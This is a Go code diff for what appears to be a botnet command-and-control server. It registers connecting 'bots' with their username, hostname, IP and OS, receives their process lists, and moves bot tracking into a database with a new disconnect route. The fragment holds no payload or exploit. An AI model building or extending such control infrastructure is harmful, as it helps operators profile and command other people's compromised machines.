@@ -8,19 +8,12 @@ import (
 	"github.com/labstack/echo"
 )
 
-var bots []types.DeviceInfoStruct
-
 // Functions
-func GetDevInfo(ctx echo.Context) types.DeviceInfoStruct {
+func GetBot(ctx echo.Context) Client {
 	id := ctx.Request().Header.Get("Session-ID")
-	var bot types.DeviceInfoStruct
-	for b := range bots {
-		if bots[b].MachineID == id {
-			bot = bots[b]
-			break
-		}
-	}
-	return bot
+	var client Client
+	DB.First(&client, Client{ID: id})
+	return client
 }
 
 // Routes
@@ -32,15 +25,22 @@ func RStatus(ctx echo.Context) error {
 func RConnect(ctx echo.Context) error {
 	dev_info := new(types.DeviceInfoStruct)
 	ctx.Bind(dev_info)
-	bots = append(bots, *dev_info)
 	fmt.Printf("New bot connection: '%s@%s' (%s) %s, %s\n", dev_info.UserName, dev_info.HostName, ctx.RealIP(), dev_info.OSName, dev_info.Arch)
+	DB.Create(&Client{ID: dev_info.MachineID, Connected: true, DeviceInfoStruct: *dev_info})
 	return ctx.JSON(http.StatusOK, types.ConnectResp{SessionID: dev_info.MachineID, Connected: true})
 }
 
 func RProcList(ctx echo.Context) error {
-	bot := GetDevInfo(ctx)
+	bot := GetBot(ctx)
 	proc_list := new([]types.Process)
 	ctx.Bind(proc_list)
 	fmt.Printf("Got process list for '%s@%s':\n", bot.UserName, bot.OSName)
+	return nil
+}
+
+func RDisconnect(ctx echo.Context) error {
+	bot := GetBot(ctx)
+	bot.Connected = false
+	DB.Save(bot)
 	return nil
 }
